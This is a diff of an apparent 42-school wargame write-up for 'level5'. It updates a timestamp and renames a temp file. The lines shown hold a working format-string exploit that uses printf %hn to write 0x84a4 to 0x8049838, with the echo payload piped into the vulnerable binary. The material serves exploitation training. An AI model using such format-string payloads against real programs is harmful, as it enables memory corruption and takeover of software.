@@ -6,7 +6,7 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:22 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/06 03:57:38 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/06 05:30:51 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -29,5 +29,5 @@ We notice that the two most significant bytes are already the same
 Because of that, we just need to write 0x84a4 to 0x8049838
 Printf %hn will do just that, since we are on a little-endian machine
 
-echo -e "\x38\x98\x04\x08%33952d%4\$hn" > /tmp/v
-cat /tmp/v - | ./level5
+echo -e "\x38\x98\x04\x08%33952d%4\$hn" > /tmp/l5
+cat /tmp/l5 - | ./level5
